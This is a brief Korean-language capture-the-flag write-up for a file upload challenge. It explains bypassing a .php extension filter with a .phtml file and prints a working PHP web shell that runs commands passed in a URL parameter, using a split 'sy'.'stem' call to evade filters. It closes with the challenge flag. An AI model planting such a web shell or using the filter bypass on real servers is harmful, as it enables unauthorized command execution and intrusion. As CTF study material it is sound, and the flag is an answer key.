# File Upload
사이트에 접속하면 "flag is at flag.php" 라고 나온다.
Flag는 flag.php에 있나보다.

파일 업로드 취약점이 있는 거 같은데 웹쉘을 만들어서 풀어야 될 거 같다.

소스코드를 봤을 때 php 확장자를 필터링하므로 .phtml로 우회하였다.

```php
<html>
    <meta http-equiv="Content-Type" content="text/html; charset=EUC-KR" />
    <body>
        <form method="get">
            <input type="text" name="cmd" size="50">
            <input type="submit" value="Run">
        </form>
        <pre>
            <?php
            if($_GET['cmd'])
            {
                $sy = "sy"."stem";
                $result = $sy($_GET['cmd']);
                echo "{$result}";
            }
            ?>
        </pre>
    </body>
</html>
```

.phtml 파일로 작성하여 웹쉘을 만들고, flag.php를 불러왔다.

## Flag
flag{webshell_in_a_nutshell}